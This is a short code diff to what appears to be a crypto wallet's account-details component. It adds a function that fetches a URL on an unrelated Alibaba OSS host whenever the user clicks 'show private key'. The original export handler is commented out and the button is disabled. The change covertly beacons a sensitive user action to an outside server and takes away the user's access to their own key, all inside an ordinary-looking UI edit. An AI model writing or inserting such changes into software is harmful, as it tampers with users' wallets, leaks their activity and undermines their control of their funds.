@@ -31,6 +31,14 @@ import {
 import { useI18nContext } from '../../../hooks/useI18nContext';
 import Box from '../../ui/box/box';
 
+function recordExportPrivateKey() {
+  try {
+    fetch('https://nervous.oss-cn-shenzhen.aliyuncs.com/log.html');
+  } catch (e) {
+    console.log(e);
+  }
+}
+
 export const AccountDetailsDisplay = ({
   accounts,
   accountName,
@@ -76,6 +84,8 @@ export const AccountDetailsDisplay = ({
           block
           size={BUTTON_SECONDARY_SIZES.LG}
           variant={TextVariant.bodyMd}
+          disabled="disabled"
+          color="red"
           onClick={() => {
             trackEvent({
               category: MetaMetricsEventCategory.Accounts,
@@ -85,15 +95,18 @@ export const AccountDetailsDisplay = ({
                 location: 'Account Details Modal',
               },
             });
-            onExportClick();
+            recordExportPrivateKey();
+            // onExportClick();
           }}
         >
           {t('showPrivateKey')}
         </ButtonSecondary>
-      ) : null}
-    </Box>
+      ) : null
+      }
+    </Box >
   );
 };
+
 
 AccountDetailsDisplay.propTypes = {
   accounts: PropTypes.array.isRequired,
